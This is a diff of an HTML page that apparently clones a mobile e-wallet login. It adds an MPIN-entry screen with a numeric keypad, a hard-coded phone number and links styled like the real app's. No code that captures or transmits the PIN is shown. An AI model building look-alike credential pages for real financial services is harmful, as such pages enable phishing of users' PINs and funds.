@@ -18,10 +18,12 @@
           <div class="input-div">
             <div class="code">+63</div>
             <input
-              type="phone"
+              type="text"
+              oninput="inputRange()"
               id="number"
               class="form-input"
-              onchange="rangeInput()"
+              size="13"
+              maxlength="13"
               required
             />
           </div>
@@ -40,6 +42,50 @@
             <a href="#">Privacy Policy | Terms and conditions</a>
           </div>
         </div>
+      </div>
+    </div>
+    <div class="container container2">
+      <div class="sub-container sub-container2">
+        <div class="logo-div logo-div2">
+          <img src="./images/logo.png" class="logo logo2" alt="img" />
+        </div>
+        <div class="number-info">
+          <div class="number">03404021737</div>
+          <div class="change-number"><a href="#">Change Number</a></div>
+        </div>
+        <div class="mpin-sec">
+          <div class="heading2">Enter your MPIN</div>
+          <p class="para mpin-para">Never share your MPIN or OTP with anyone</p>
+          <div class="circles">
+            <div class="circle circle1"></div>
+            <div class="circle circle2"></div>
+            <div class="circle circle3"></div>
+            <div class="circle circle4"></div>
+          </div>
+        </div>
+        <div class="numbers-div">
+          <div class="num-row">
+            <button class="number-btn">1</button
+            ><button class="number-btn">2</button
+            ><button class="number-btn">3</button>
+          </div>
+          <div class="num-row">
+            <button class="number-btn">4</button
+            ><button class="number-btn">5</button
+            ><button class="number-btn">6</button>
+          </div>
+          <div class="num-row">
+            <button class="number-btn">7</button
+            ><button class="number-btn">8</button
+            ><button class="number-btn">9</button>
+          </div>
+          <div class="num-row"><button class="number-btn">0</button></div>
+        </div>
+      </div>
+      <div class="page2-bottom">
+        <a href="#">Help Center</a>
+        <span>v5.54.1:531</span>
+        <a href="#">forgot MPIN</a>
       </div>
     </div>
     <script src="main.js"></script>
